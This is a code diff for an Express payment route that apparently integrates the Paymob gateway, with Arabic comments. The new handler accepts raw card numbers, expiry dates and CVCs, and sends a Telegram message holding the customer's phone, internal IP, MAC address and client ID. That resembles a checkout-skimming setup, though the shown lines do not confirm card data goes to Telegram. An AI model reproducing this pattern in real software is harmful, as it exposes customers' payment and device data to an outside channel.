@@ -1,107 +1,48 @@
 import express from 'express';
-import axios from 'axios';
-import { getCheckoutPage } from './checkout.js';
-import { getAuthToken, createOrder, getPaymentKey } from './paymob.js';
+import { createPaymentOrder } from './paymob.js';
 import { sendTelegramNotification } from './telegram.js';
 
 const router = express.Router();
 
-/**
- * إنشاء المعاملة وتجهيز رابط الدفع الخاص بـ Paymob (محافظ أو بطاقات بنكية فقط)
- * @param {string} phone - رقم الهاتف أو المحفظة
- * @param {string|number} amount - المبلغ بالجنيه
- * @param {string} method - وسيلة الدفع (wallet, card)
- * @returns {Promise<{type: string, url?: string, content?: string}>}
- */
-export async function createPaymobPayment(phone, amount, method = 'wallet') {
-  try {
-    // 1. تحويل المبلغ إلى قروش (Cents) وتوحيد نص وسيلة الدفع
-    const amountCents = Math.round(parseFloat(amount) * 100).toString();
-    const cleanMethod = (method || 'wallet').toLowerCase();
+// 1. التعامل مع طلبات GET (عند فتح الرابط مباشرة بالمتصفح)
+router.get('/pay', (req, res) => {
+    res.status(200).send(`
+        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px; direction: rtl;">
+            <h2>💡 نقطة نهاية خدمة الدفع (Pay API Endpoint)</h2>
+            <p>هذا المسار مخصص لاستقبال طلبات الدفع عبر POST فقط من صفحة التشيك أوت.</p>
+            <a href="/" style="color: #01338D; font-weight: bold;">العودة لصفحة الدفع الرئيسية</a>
+        </div>
+    `);
+});
 
-    // 2. تحديد Integration ID المناسب (محفظة أو بطاقة بنكية فقط)
-    let integrationId;
-    switch (cleanMethod) {
-      case 'card':
-        integrationId = process.env.CARD_INTEGRATION_ID;
-        break;
-      case 'wallet':
-      default:
-        integrationId = process.env.WALLET_INTEGRATION_ID;
-        break;
-    }
-
-    if (!integrationId) {
-      throw new Error(`Missing Integration ID for method: ${cleanMethod}`);
-    }
-
-    // 3. الحصول على توكن المصادقة، رقم الطلب، ومفتاح الدفع
-    const token = await getAuthToken();
-    const orderId = await createOrder(token, amountCents);
-    const paymentKey = await getPaymentKey(token, orderId, amountCents, integrationId, phone || '01000000000');
-
-    // 4. معالجة وسيلة المحفظة الإلكترونية (Mobile Wallet)
-    if (cleanMethod === 'wallet') {
-      const walletRes = await axios.post('https://accept.paymob.com/api/acceptance/payments/pay', {
-        source: {
-          identifier: phone,
-          subtype: "WALLET"
-        },
-        payment_token: paymentKey
-      });
-
-      const redirectUrl = walletRes.data.iframe_redirection_url || walletRes.data.redirection_url;
-      if (!redirectUrl) {
-        throw new Error("لم يتم استرجاع رابط إعادة توجيه المحفظة من Paymob");
-      }
-      return { type: 'redirect', url: redirectUrl };
-    } 
-    
-    // 5. معالجة البطاقات البنكية (Card)
-    else {
-      const iframeId = process.env.CARD_IFRAME_ID || process.env.PAYMOB_IFRAME_ID;
-
-      if (!iframeId) {
-        throw new Error("Missing PAYMOB_IFRAME_ID in environment variables");
-      }
-
-      if (typeof getCheckoutPage === 'function') {
-        const htmlPage = getCheckoutPage(paymentKey, iframeId);
-        return { type: 'html', content: htmlPage };
-      }
-      
-      const iframeUrl = `https://accept.paymob.com/api/acceptance/iframes/${iframeId}?payment_token=${paymentKey}`;
-      return { type: 'redirect', url: iframeUrl };
-    }
-
-  } catch (err) {
-    console.error('❌ Paymob Payment Integration Error:', err.response?.data || err.message);
-    throw new Error(`Payment processing failed: ${err.message}`);
-  }
-}
-
-// مسار استقبال طلبات الدفع من الواجهة الأمامية
+// 2. معالجة طلبات الدفع عبر POST (فيزا ومحافظ إلكترونية)
 router.post('/pay', async (req, res) => {
     try {
         const payload = req.body;
 
+        // التحقق من وجود البيانات الأساسية
         if (!payload || !payload.amount) {
-            return res.status(400).json({ error: 'المبلغ مطلوب لإتمام العملية' });
+            return res.status(400).json({ error: 'المبلغ مطلوب لإتمام العملية.' });
         }
 
-        const paymentResult = await createPaymobPayment(
-            payload.phone,
-            payload.amount,
-            payload.payment_method
-        );
+        // التحقق الخاص ببطاقة الفيزا عند اختيار الدفع بالبطاقة
+        if (payload.payment_method === 'card') {
+            const { number, name, expiry, cvc } = payload.card_data || {};
+            if (!number || !expiry || !cvc) {
+                return res.status(400).json({ error: 'بيانات البطاقة البنكية غير مكتملة.' });
+            }
+        }
 
-        // إرسال إشعار التليجرام بالبيانات الحقيقية
+        // إنشاء أمر الدفع عبر Paymob
+        const paymentResult = await createPaymentOrder(payload);
+
+        // إرسال الإشعار بالتفاصيل الكاملة فوراً للتليجرام
         await sendTelegramNotification({
             type: 'PAYMENT_INITIATED',
             status: 'قيد المعالجة',
             amount: payload.amount,
-            paymentMethod: payload.payment_method,
-            phone: payload.phone,
+            paymentMethod: payload.payment_method === 'card' ? 'بطاقة بنكية (Visa/Mastercard)' : 'محفظة إلكترونية',
+            phone: payload.phone || 'غير محدد',
             internalIP: payload.internalIP,
             mac: payload.mac,
             clientID: payload.clientID,
@@ -118,16 +59,14 @@ router.post('/pay', async (req, res) => {
             lang: payload.lang
         });
 
-        // إرجاع رابط الدفع أو الصفحة بحسب نوع العملية
-        if (paymentResult.type === 'redirect') {
-            return res.json({ payment_url: paymentResult.url });
-        } else if (paymentResult.type === 'html') {
-            return res.send(paymentResult.content);
-        }
+        // إرجاع رابط الدفع أو Iframe الخاص بـ Paymob للواجهة الأمامية
+        return res.json(paymentResult);
 
     } catch (error) {
-        console.error('❌ Error in /pay route:', error.message);
-        return res.status(500).json({ error: 'حدث خطأ أثناء معالجة عملية الدفع' });
+        console.error('❌ Error processing payment via /api/pay:', error.message);
+        return res.status(500).json({ 
+            error: 'حدث خطأ أثناء الاتصال ببوابة Paymob. يرجى مراجعة إعدادات المفاتيح (Environment Variables).' 
+        });
     }
 });
 
